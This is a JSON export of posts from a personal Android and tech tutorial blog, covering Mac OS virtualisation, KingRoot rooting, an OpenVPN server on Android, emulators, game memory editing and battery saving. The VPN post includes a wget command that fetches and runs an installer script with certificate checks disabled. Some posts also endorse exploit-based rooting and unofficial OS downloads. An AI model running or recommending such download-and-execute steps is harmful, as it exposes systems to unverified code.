src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/storage-1024x576.jpg\" alt=\"Virtual Box Mac OS Settings\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/storage-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/storage-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/storage-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/storage.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n\nFinally, you&#8217;re ready to start the VM. Be patient, it might take a few minutes before you see the welcome screen.\n\nspan style=\"color: #999999;\"strongemSetting up the VM doesn&#8217;t need to be done in Ubuntu. You could do this on another PC, install Mac OS, then transfer the Virtual Disk Image to Ubuntu/strong/em/span/p \n\nh2\n  Step 4: Installing Mac OS X\n/h2\n\np\n  The installation process for Mac OS X is pretty straightforward. The only thing to take note of is setting up the virtual disk image. When you get to the installation screen, got to the toolbar and look for emDisk Utilities.  /em\n/p\n\np\n  img class=\"alignnone size-large wp-image-1372\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/disk-utilties-1024x576.jpg\" alt=\"Mac OS Install Disk Ultities\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/disk-utilties-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/disk-utilties-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/disk-utilties-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/disk-utilties.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n/p\n\np\n  Within Disk Utilities, select your virtual hard drive then go to erase. You can choose to give it a name, and make sure that the format is Mac OS Journaled.\n/p\n\np\n  img class=\"alignnone size-large wp-image-1371\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/erase-1024x576.jpg\" alt=\"Mac OS Install Disk Ultities Partition\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/erase-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/erase-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/erase-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/erase.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n/p\n\np\n  Now, you should see it as an installation option once you exit disk utility. Install the OS to that drive.\n/p\n\np\n  img class=\"alignnone size-large wp-image-1370\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/installation-1-1024x576.jpg\" alt=\"Mac OS Install \" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/installation-1-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/installation-1-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/installation-1-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/installation-1.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n/p\n\np\n  After about 30 minutes, you should be all set. Reboot your VM (don&#8217;t forget to remove the Disk Image from the optical drive so that you don&#8217;t go back to the stup) and you should boot into Mac OS.\n/p\n\np\n  img class=\"alignnone size-large wp-image-1369\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/02/mac-os-on-chromebook-1-1024x576.jpg\" alt=\"mac os on chromebook\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/02/mac-os-on-chromebook-1-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/02/mac-os-on-chromebook-1-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/02/mac-os-on-chromebook-1-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/02/mac-os-on-chromebook-1.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n/p\n",
        "tags": [
            "chrome",
            "chromebook",
            "crouton",
            "emulation",
            "linux",
            "mac os",
            "mac os chromebook",
            "ubuntu"
        ]
    },
    {
        "uri": "/root-any-android/",
        "title": "Root any Android",
        "content": "{{ youtube sI0HiXPLamk }}\r\n\r\nI always get a lot of questions asking for instructions on how to root a particular device. Unfortunately, the root exploit that worked on one device might now work on another. This usually means that the user will have to spend hours searching for a method to root their device. This tasks becomes even more challenging if their device from a little known company without a development community. Luckily, there is a way to ease this frustration.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nA popular app called King Root is aimed at providing users a simple way to root their device. This device uses a &#8220;it just works&#8221; ideology. All the user needs to do is download the app, and let it do all the work. Behind the scenes, the app is seaching through a database of known exploits and figuring which one that it can apply to your device. Once it finds it, it will use that exploit to root your device. The cool thing is that this seems to work on most Android devices without any problem. It is truly a one-click solution. However, the developers behind King Root have been under internet scrutiny for questionable privacy concerns and invasions pertaining to sensitive device information. Of course, nothing is confirmed as these are all rumors. So perform this procedure at your own risk.\r\n\r\nObtain Root\r\n\r\nNavigate to a href=\"http://www.kingroot.net/\" target=\"blank\"http://www.kingroot.net//a and download the apk to your phone. Click the download to apk to install (make sure you have off market apps checked in your security settings). Afterwards, wait for the app to analyze your phone and start the root process. You can use a href=\"https://play.google.com/store/apps/details?id=com.joeykrim.rootcheck\" target=\"blank\"this app/a to verify if you have root.\r\n",
        "tags": [
            "android",
            "exploit",
            "kingroot",
            "root",
            "root any android"
        ]
    },
    {
        "uri": "/top-android-apps-2016/",
        "title": "My Top Android Apps 2016",
        "content": "{{ youtube MS9gHxtCe14 }}\r\n\r\nHere are some of the apps that I use everyday on my device.\r\n",
        "tags": []
    },
    {
        "uri": "/watercooling-smartphones-explained/",
        "title": "Watercooling in Smartphones Explained",
        "content": "{{ youtube NCACUuzeecA }}\r\n\r\nHow does watercooling work in Smartphones like the Galaxy S7?\r\n",
        "tags": [
            "cooling",
            "galaxy s7",
            "smartphones",
            "water"
        ]
    },
    {
        "uri": "/galaxy-s7-unboxing/",
        "title": "Galaxy S7 Unboxing",
        "content": "{{ youtube MZRXTrEPNiY }}\r\n\r\nA Galaxy S7 Unboxing.\r\n",
        "tags": [
            "galaxy s7",
            "s7",
            "unboxing"
        ]
    },
    {
        "uri": "/galaxy-s7-features-game-launcher/",
        "title": "Galaxy S7 Features: Game Launcher",
        "content": "{{ youtube O9_0DBVH0Xc }}\r\n\r\nThe Galaxy S7 features a Game Launcher that is actually very convenient and easy to use while adding useful features during gameplay.\r\n",
        "tags": [
            "features",
            "galaxy",
            "game",
            "launcher",
            "s7"
        ]
    },
    {
        "uri": "/galaxy-s7-ram-management/",
        "title": "Galaxy S7 RAM Management",
        "content": "{{ youtube oodCHShweYY }}\r\n\r\nHere&#8217;s a look at the Galaxy S7 RAM Management. Has Samsung improved over the S6&#8217;s terribly aggressive memory management?\r\n",
        "tags": [
            "apps",
            "galaxy s7",
            "management",
            "open",
            "ram",
            "s7"
        ]
    },
    {
        "uri": "/galaxy-s7-review-dont-buy-hype/",
        "title": "Galaxy S7 Review – Don’t Buy into Hype",
        "content": "{{ youtube dWxHDh51zDs }}\r\n\r\nThe Galaxy S7 Review is here. Although I am very critical on Samsung&#8217;s skin, I would say that the S7/S7 edge might be the best smartphone of 2016.\r\n",
        "tags": [
            "android",
            "buy",
            "galaxy",
            "gs7",
            "hype",
            "review",
            "s7"
        ]
    },
    {
        "uri": "/connect-floppy-drive-galaxy-s7/",
        "title": "Connect Floppy Drive to Galaxy S7",
        "content": "{{ youtube 7eVbovqn0Jk }}\r\n\r\nYes, you can connect a floppy drive to the Galaxy S7 or any Android device really. Just something random and simple I wanted to share. Of course&#8230;I don&#8217;t know why you would actually want to connect a floppy drive to your device.\r\n",
        "tags": [
            "floppy",
            "galaxy s7",
            "otg",
            "usb"
        ]
    },
    {
        "uri": "/silent-boot-android/",
        "title": "Silent Boot Android",
        "content": "{{ youtube NuDiqttzrm4 }}\r\n\r\nI hate the carrier boot sound when restarting my phone. Here&#8217;s how to boot without hearing it.\r\n  \r\nThis video includes a Sponsored Message from Norton.\r\n  \r\nCheck out Norton&#8217;s The Most Dangerous Town Ep. 2 &#8211; http://full.sc/MDT-OSG\r\n",
        "tags": [
            "android",
            "remove",
            "silent",
            "Silent Boot Android",
            "sound",
            "startup"
        ]
    },
    {
        "uri": "/computer-fire-giveaway/",
        "title": "Computer on Fire!",
        "content": "{{ youtube S8n006am9-g }}\r\n\r\nMy Computer Caught on Fire! Oh&#8230;and here&#8217;s a giveaway too.\r\n  \r\nGiveaway is now closed! Thanks to all who entered!\r\n\r\nYou can also purchase the 8000Mah ToughTested case here:\r\n  \r\nhttp://goo.gl/d4WlSH\r\n",
        "tags": [
            "computer",
            "fire",
            "power",
            "supply"
        ]
    },
    {
        "uri": "/top-features-android-n/",
        "title": "Top Features Android N",
        "content": "{{ youtube Rjbi1TkNLDI }}\r\n\r\nThe Android N Developer Preview has arrived. Here are some of the top new features you can find in Android N.\r\n\r\n&nbsp;\r\n",
        "tags": [
            "android",
            "developer",
            "features",
            "nougat",
            "nougut",
            "nugut",
            "nuogut",
            "preview",
            "top"
        ]
    },
    {
        "uri": "/read-car-computer-android/",
        "title": "Read Car Computer with Android",
        "content": "{{ youtube 5CznLF7JvU0 }}\r\n\r\nYou can use a bluetooth OBD II tool with your Android device to read important information from your car&#8217;s computer and even see real time data.\r\n\r\nOBD II: https://goo.gl/rQb68v\r\n\r\nTorque App: https://goo.gl/UDNCDT\r\n",
        "tags": [
            "android",
            "car",
            "computer",
            "engine",
            "obd",
            "read",
            "tool"
        ]
    },
    {
        "uri": "/college-students-try-vr-horror-porn/",
        "title": "College Students try VR Horror and Porn",
        "content": "{{ youtube ZIw_UXnmwLc }}\r\n\r\nSo I gathered a couple of friends to try out Virtual Reality Horror Games and of course porn. In the end, a bunch of laughter ensues.\r\n\r\nVR Headets Used:\r\n  \r\nGrear VR: http://goo.gl/LgIkl5\r\n  \r\nLing VR: http://goo.gl/3OQVPp\r\n",
        "tags": [
            "comedy",
            "funny",
            "horror",
            "porn",
            "virtual reality",
            "vlog",
            "vr"
        ]
    },
    {
        "uri": "/vpn-server-android/",
        "title": "VPN Server on Android",
        "content": "If you&#8217;re not using a VPN, you should consider using one. A Virtual Private Network (VPN) extends a private network across a public network. This gives you an added layer of security and privacy. Imagine if you are sitting at a Starbucks on their free public WiFi. Well, someone could have a program such as Wireshark or any other application open and sniff traffic across the network. Potentially, information such as usernames, passwords and other sensitive data could be exposed. Now let&#8217;s say you are using a VPN to connect to your home network while you are at Starbucks. Now, anyone who might be sniffing traffic will only see you connect to the IP address of your home network and not any other sites that you connect to. For more information about VPNs, check out this useful lifehacker article.\n\nNow that you understand what a VPN is, let&#8217;s talk about running one on Android. Most tutorials will tell you how to connect to a VPN server from your Android, but not actually how to run one on your Android device. To do this, we will be using the power of Linux along with a automatic OpenVPN installer script. So before we get starting running a VPN Server on Android, make sure that you have Linux installed on your Android device.\n\n{{ ad }}\n\nWhat You Will Need:\n\n  Android Device (rooted) with Linux\n  OpenVPN Connect\n  Root Explorer (Optional)\n\n Step 1: Making Directories\n\nLet&#8217;s jump right into this. Launch the Linux chroot on your Android device. I am using Linux Deploy in combination with terminal emulator. The first thing that we need to do is create a new directory in the /dev folder. This is because we need a file called tun. However, tun is located underneath /dev/net. So rather than cariously moving it, we will simply be symlinking it. Type in the following:\n\nprecd .../\n\nmkdir /dev/net\n\nln -s dev/tun /dev/net/tun/pre\n\nThe last line symlinks the tun file. So now the OpenVPN program will think the tun file is in the dev directory when it is really in the net directory.\n\n{{ ad }}\n\nStep 2: Install\n\nTo take all the hassle out of setting up OpenVPN, we will be using an automated installer script. Type in the follow:\n\nprewget http://git.io/vpn --no-check-certificate -O openvpn-install.sh; chmod +x openvpn-install.sh;/pre\n\npre./openvpn-install.sh/pre\n\nThis will begin the installer. From this point everything is self-explanatory. Input your IP address and generate keys for the clients that you want connecting to your VPN server. It will also output a corresponding .ovpn file that we will need to use if we want to connect using OpenVPN from another android device. It will also start the OpenVPN service.\n\nimg class=\"alignnone size-large wp-image-1489\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/04/VPN-Server-on-Android.00010512.Still002-1024x576.jpg\" alt=\"OpenVPN Automated Installer\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/04/VPN-Server-on-Android.00010512.Still002-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/04/VPN-Server-on-Android.00010512.Still002-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/04/VPN-Server-on-Android.00010512.Still002-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/04/VPN-Server-on-Android.000105_12.Still002.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n\n Step 3: Transferring Keys\n\nFinally, you need to move the generated keys to somewhere that you can access from within Android. Remember, the Linux environment and Android environment don&#8217;t share the same folders in your Chroot. One simple way around this is to copy the generated .ovpn file to the /dev folder (that is shared between the Linux environment and Android). Then, from within Android, use root explorer to grab that .ovpn file and move it to somewhere save, like your downloads folder. In any case, make sure you are able to get that .ovpn file so that you can send it to the client that you need.\n\n{{ ad }}\n\nStep 4: Connecting\n\nimg class=\"alignnone size-large wp-image-1490\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/04/VPN-Server-on-Android.00020628.Still001-1024x576.jpg\" alt=\"OpenVPN Connect Android App\" width=\"720\" height=\"405\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/04/VPN-Server-on-Android.00020628.Still001-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/04/VPN-Server-on-Android.00020628.Still001-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/04/VPN-Server-on-Android.00020628.Still001-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/04/VPN-Server-on-Android.000206_28.Still001.jpg 1280w\" sizes=\"(max-width: 720px) 100vw, 720px\" /\n\nIf you want to connect to your OpenVPN server from another Android device, download the OpenVPN connect app. From within the app, import the file that you transferred from the previous step. When you hit connect, it should connect you to the OpenVPN server running on your (other) Android device.\n\n [1]: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=15&cad=rja&uact=8&ved=0ahUKEwiVlcTzx5TMAhXLLyYKHTZ9Bf8QFgiYATAO&url=http%3A%2F%2Flifehacker.com%2F5940565%2Fwhy-you-should-start-using-a-vpn-and-how-to-choose-the-best-one-for-your-needs&usg=AFQjCNGwNKT1EF5NsdOU5IJqR1gibVQoBA&sig2=Lxj5ekibP4CsQ4-BZO0JeQ\n [2]: http://www.davebennett.tech/run-linux-on-android/\n [3]: https://play.google.com/store/apps/details?id=net.openvpn.openvpn\n [4]: https://play.google.com/store/apps/details?id=com.speedsoftware.rootexplorer\n",
        "tags": [
            "android",
            "linux",
            "openvpn",
            "root",
            "vpn"
        ]
    },
    {
        "uri": "/counter-strike-android/",
        "title": "Counter Strike on Android",
        "content": "&nbsp;\n\nHow would you like to play one of the most popular PC games of all time on your Android device? So, maybe playing a href=\"http://www.davebennett.tech/half-life-2-on-android/\" target=\"blank\" rel=\"noopener\"Half-Life 2 /aand a href=\"http://www.davebennett.tech/play-team-fortress-classic-on-android/\" target=\"blank\" rel=\"noopener\"Team-Fortress classic/a on Android isn&#8217;t cool enough for you. Well, how about Counter Strike on Android? Of course, this isn&#8217;t going to be the latest Counter Strike Global Offensive with the Source Engine. It&#8217;s going to be the old school original counter strike from the late 90s.\n\nThis is all possible thanks to an app called a href=\"https://github.com/SDLash3D/xash3d-android-project/releases/tag/v0.17.1\" target=\"blank\" rel=\"noopener\"Xash3D/a.  It uses the SDL library that allows you to do some really cool emulation such as running a href=\"http://www.davebennett.tv/run-windows-95-on-android/\" target=\"blank\" rel=\"noopener\"Windows 95 on your device/a. Overall, the performance offered from this app is amazing. Interestingly enough, there are a couple of servers still running for the original counter strike, so you can play multiplayer with this.\n\n{{ ad }}\n\nWhat You Will Need:\n\n  Original Counter Strike 1.6 Game\n  a href=\"https://github.com/SDLash3D/xash3d-android-project/releases/tag/v0.17.1\" target=\"_blank\" rel=\"noopener\"Xash3D/a\n  Android CSClient\n\n How To:\n\nSo the process to get this running is fairly simple. First, create a folder called xash on your Android device. Then, copy your Valve **and **Cstrike folder from your Counter Strike installation to the xash folder on your device. Finally, download and install the two apps listed above.\n\nLaunch the CS client app on your Android device. Then select the button at the bottom to launch the CS game.\n\nThis will launch Counter Strike. The gameplay itself is smooth (as to be expected from a game over 10 years old) and you are able to use the on-screen controls or a Bluetooth controller if you have one available. There also might be one or two server online that you can join in for online multiplayer. Give it a try!\n\nimg class=\"alignnone size-large wp-image-1501\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/04/Screenshot2016-04-17-12-22-50-1024x576.jpg\" alt=\"Counter Strike on Android\" width=\"1024\" height=\"576\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/04/Screenshot2016-04-17-12-22-50-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/04/Screenshot2016-04-17-12-22-50-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/04/Screenshot2016-04-17-12-22-50-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/04/Screenshot_2016-04-17-12-22-50.jpg 1280w\" sizes=\"(max-width: 1024px) 100vw, 1024px\" /\n\n [1]: https://github.com/SDLash3D/cs16-client/releases/download/v1.01/cs16-client-release-omp.apk\n",
        "tags": [
            "android",
            "counter strike",
            "emulate",
            "emulator",
            "gaming",
            "steam",
            "xash"
        ]
    },
    {
        "uri": "/laser-keyboard/",
        "title": "Laser Keyboard",
        "content": "{{ youtube 7kJFKcgi4Bo }}\r\n\r\nAre laser keyboards the new thing?\r\n\r\nAGS Laser Keyboard: http://goo.gl/DItpbm\r\n",
        "tags": [
            "cool",
            "gadgets",
            "keyboard",
            "laser",
            "review"
        ]
    },
    {
        "uri": "/fallout-4-tribute/",
        "title": "Fallout 4 Tribute",
        "content": "{{ youtube YHL2e1zpd_g }}\r\n\r\nSo I had some leftover Fallout 4 footage lying around and I came across Lune by NCS. I feel like this song would be the perfect soundtrack for this game. So here&#8217;s a short video montage of a few action shots.\r\n",
        "tags": [
            "action",
            "fallout",
            "fallout 4",
            "gameplay",
            "shots",
            "trailer",
            "trailor",
            "tribute"
        ]
    },
    {
        "uri": "/run-windows-7-android/",
        "title": "Run Windows 7 on Android",
        "content": "I can&#8217;t believe I&#8217;m saying it, but you can run Windows 7 on your Android device. To be honest,  I was convinced that running Windows XP on Android would be the final step in Windows emulation, but I was wrong. Before you get too excited about playing the latest AAA title on your phone, keep in mind that this is nothing further than a proof of concept. The performance is painfully sluggish and the app might crash if Windows starts using too much memory.\n\nHow are we doing this? This is all thanks to the bochs emulator which allows us to emulate practically anything; including running a href=\"http://www.davebennett.tech/run-windows-95-on-android/\" target=\"blank\" rel=\"noopener\"Windows 95 on Android/a. The driving force behind bochs is the SDL library which is built into a lot of other emulation apps. For example, Xash3D partially uses it to to allow the use of cool stuff like a href=\"http://www.davebennett.tech/counter-strike-android/\" target=\"blank\" rel=\"noopener\"Counter Strike on Android wear/a. The copy of Windows 7 that we will be using is a portable and debloated version that I found online. So use this at your own risk. So here&#8217;s how to run Windows 7 on Android:\n\n{{ ad }}\n\nWhat You Will Need:\n\n  a href=\"http://forum.xda-developers.com/attachment.php?attachmentid=814993&d=1323778011\" target=\"_blank\" rel=\"noopener\"Bochs For Android/a\n  a href=\"http://www.mediafire.com/download/sr4ikomw86226z4/adb.zip\" target=\"_blank\" rel=\"noopener\"SDL Zip/a\n\n How To:\n\nFirst download the SDL zip from above. Then copy and paste the SDL folder to your device&#8217;s internal storage.\n\nimg class=\"alignnone size-large wp-image-1522\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/05/SDl-folder-1024x249.jpg\" alt=\"SDL folder\" width=\"1024\" height=\"249\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/05/SDl-folder-1024x249.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/05/SDl-folder-300x73.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/05/SDl-folder-768x187.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/05/SDl-folder.jpg 1280w\" sizes=\"(max-width: 1024px) 100vw, 1024px\" /\n\nNext download the install the Bochs Apk. When you launch it, it should begin booting Windows 7. Remember, this is going to take a long time to boot. It took me approximately 15 minutes util I was at the desktop screen. For added productivity, you can connect an external keyboard and mouse. Unfortunately, there is no internet connection so you are limited to local programs only. I also doubt that this will be able to handle Chrome or Internet explorer anyway. When you are done playing around with windows, remember to properly shut down or you will be force to sit through repair options the next time you boot up.\n\nimg class=\"alignnone size-large wp-image-1523\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/05/Windows-7-1024x576.jpg\" alt=\"Windows 7 on Android\" width=\"1024\" height=\"576\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/05/Windows-7-1024x576.jpg 1024w, http://localhost/wordpress/wp-content/uploads/2016/05/Windows-7-300x169.jpg 300w, http://localhost/wordpress/wp-content/uploads/2016/05/Windows-7-768x432.jpg 768w, http://localhost/wordpress/wp-content/uploads/2016/05/Windows-7.jpg 1280w\" sizes=\"(max-width: 1024px) 100vw, 1024px\" /\n\n&nbsp;\n",
        "tags": [
            "android emulation",
            "windows",
            "windows 7",
            "windows 7 on android",
            "windows on android",
            "windows xp on android"
        ]
    },
    {
        "uri": "/hack-android-apps-and-games/",
        "title": "Hack Android Apps and Games",
        "content": "Wouldn&#8217;t it be great if every game had cheat codes? Well, this might be closer than you think. Using the app Game Guardian, we can change the value of any numerical data within Android games. Yes, you can now achieve an unbeatable high score in your favorite game.\n\nTo do this you will need to have a rooted Android device. The process for this is fairly simple. We need to find the location of the desired attribute then change its value. The challenging part is finding the location of the attribute. Without going too deep into computer memory and assembly language, just know that a hex address points to each value in memory. Once we find that hex address we can change the value. You should also be aware that this will not work with every game. Lots of games might have an &#8220;anti-cheat&#8221; mechanism that will detect for extremely large numbers at places where they shouldn&#8217;t exist. So here&#8217;s how to hack Android apps and games:\n\n{{ ad }}\n\nWhat You Will Need:\n\n  Rooted Android Device\n  a href=\"https://gameguardian.net/download\" target=\"_blank\" rel=\"noopener\"Game Guardian/a\n\n Step 1: Installing\n\nAfter you download and install Game Guardian, launch it and start the service. You will see a floating window of the game guardian icon. You can adjust its size and opacity in the settings menu if it&#8217;s difficult to see.\n\nimg class=\"alignnone wp-image-1541 size-medium\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/Screenshot20160602-225315-169x300.jpg\" alt=\"Game Guardian\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot20160602-225315-169x300.jpg 169w, http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot_20160602-225315.jpg 405w\" sizes=\"(max-width: 169px) 100vw, 169px\" /\n\nStep 2: In Game\n\nThe next logical thing to do is get a game that you want to test this on. I am going to use the game Stack. Within Game Guardian, select Stack as the application.\n\nimg class=\"alignnone size-medium wp-image-1542\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/Screenshot20160602-225332-169x300.jpg\" alt=\"Game Guardian Hack ANdroid apps\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot20160602-225332-169x300.jpg 169w, http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot_20160602-225332.jpg 405w\" sizes=\"(max-width: 169px) 100vw, 169px\" /\n\nWhat we want to do is achieve an insanely high score. First, we need to locate the address that points to the score variable. In order to do this, we will need to buildup an arbitrary score that we can search for. So play the game until you reach a score of 2 or 3.\n\n{{ ad }}\n\nNow go into Game Guardian. Select the button that reads &8220;Known and enter the value that you want to search for. For simplicity, set the type to auto. You will most likely come across a large list of addresses that point to the value 2 or 3.\n\n img class=\"alignnone size-medium wp-image-1543\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/Screenshot20160602-225345-169x300.jpg\" alt=\"Game Guardian Hack Android Apps\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot20160602-225345-169x300.jpg 169w, http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot20160602-225345.jpg 405w\" sizes=\"(max-width: 169px) 100vw, 169px\" /img class=\"alignnone size-medium wp-image-1544\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/Screenshot20160602-225358-169x300.jpg\" alt=\"Game Guardian Hack Android Apps\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot20160602-225358-169x300.jpg 169w, http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot20160602-225358.jpg 405w\" sizes=\"(max-width: 169px) 100vw, 169px\" /\n\nUnfortunately, we can&#8217;t safely change anything because we wouldn&#8217;t know which one to choose. So the solution is to go back and continue playing until you reach another number. So say you reach the score of 10. Go back to Game Guardian and search for 10. The list will probably be smaller than before but still too large. So repeat the process one more time.\n\nimg class=\"alignnone size-medium wp-image-1545\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/Screenshot20160602-225418-169x300.jpg\" alt=\"Game Guardian Hack Android Apps\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot20160602-225418-169x300.jpg 169w, http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot_20160602-225418.jpg 405w\" sizes=\"(max-width: 169px) 100vw, 169px\" /\n\nNow suppose that your score is 12. When you go back to Game Guardian, you might see a value that reads 12 (this is still from your previous search of 9). If that&#8217;s the case, then you have successfully pinpointed the right address. The last thing to do is change the value.\n\nimg class=\"alignnone size-medium wp-image-1546\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/Screenshot20160602-225439-169x300.jpg\" alt=\"Game Guardian Hack Android Apps\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot20160602-225439-169x300.jpg 169w, http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot_20160602-225439.jpg 405w\" sizes=\"(max-width: 169px) 100vw, 169px\" /\n\nSelect the value with D. D is short for DWORD which is the size of the data on a 32 bit architecture. It&#8217;s more than likely that the phone you&#8217;re using is at least 32bits, so this is what you will need. Change that value to something like 300 and save it. Now when you go back to the game, the value should be changed.\n\nimg class=\"alignnone size-medium wp-image-1547\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/Screenshot20160602-225445-169x300.jpg\" alt=\"Game Guardian Hack Android Apps\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot20160602-225445-169x300.jpg 169w, http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot_20160602-225445.jpg 405w\" sizes=\"(max-width: 169px) 100vw, 169px\" /\n",
        "tags": [
            "android",
            "apps",
            "games",
            "guardian",
            "hack",
            "root"
        ]
    },
    {
        "uri": "/save-battery-life-android/",
        "title": "Save Battery Life on Android",
        "content": "{{ youtube MU_sKjN6rz4 }}\r\n\r\nEvery year, smartphones get better and better. We live in the age where the average smartphone has better specs than a two year old computer. Despite all of this technological innovation, battery life is still a major concern for many consumers. It&#8217;s simple, we need longer lasting batteries. Unfortunately, until there is a scientific breakthrough with battery technology, this is unlikely to change. Fortunately, there is a way that you can get the most out of your battery.\r\n\r\n[adinserter block=&#8221;5&#8243;]\r\n\r\nThis tutorial is going to apply specifically to any android device running Android 6.0 (Marshmallow) or above. Android 6.0 introduced a feature called doze. Doze puts your device into deep sleep to conserve power. This might seem insignificant, but it works wonders! On my Nexus 5X, I managed to loose no more than 1% of battery during an hour and a half lecture. There is one thing that is annoying with doze; it takes awhile to activate. In order for doze to activate, your device must be idle for at least 30 minutes. That means your device has to be doing nothing more than sitting untouched on a surface. As you can guess, there is much room for improvement. Let&#8217;s use the app Gentrify to save battery life on Android.\r\n\r\nWhat You Will Need:\r\n\r\n  a href=\"https://play.google.com/store/apps/details?id=com.oasisfeng.greenify&hl=en\" target=\"blank\"Greenify /aor a href=\"https://www.dropbox.com/sh/mspso6yvv1wbvju/p0AK2l3vmZ\" target=\"blank\"Greenify Beta/a\r\n  a href=\"http://forum.xda-developers.com/showthread.php?p=48915118post48915118\" target=\"_blank\"ADB Tools (Optional)/a\r\n\r\nBetter Doze:\r\n\r\nGreenify has an option called Aggressive Doze.\r\n\r\nimg class=\"alignnone size-medium wp-image-1565\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/Screenshot20160610-100720-169x300.jpg\" alt=\"Greenify Aggressive Doze\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot20160610-100720-169x300.jpg 169w, http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot_20160610-100720.jpg 405w\" sizes=\"(max-width: 169px) 100vw, 169px\" /\r\n\r\nAggressive Doze  enables the default doze to kick in around 10 minutes of no activity. You can also enable the notification to show when the device entered doze and for how long. You might also want to whitelist certain apps that don&8217;t use Google&#8217;s cloud notification system, as they might not work properly when the device is in doze.\r\n\r\nMy White listed apps\r\n\r\nimg class=\"alignnone size-medium wp-image-1564\" src=\"http://www.davebennett.tech/wp-content/uploads/2016/06/Screenshot20160610-100947-169x300.jpg\" alt=\"Greenify Whitelisted Apps\" width=\"169\" height=\"300\" srcset=\"http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot20160610-100947-169x300.jpg 169w, http://localhost/wordpress/wp-content/uploads/2016/06/Screenshot_20160610-100947.jpg 405w\" sizes=\"(max-width: 169px) 100vw, 169px\" /\r\n\r\n&nbsp;\r\n\r\nEven Better Doze\r\n\r\nThe above method should be fine for most people. But if you want to maximize the most out of 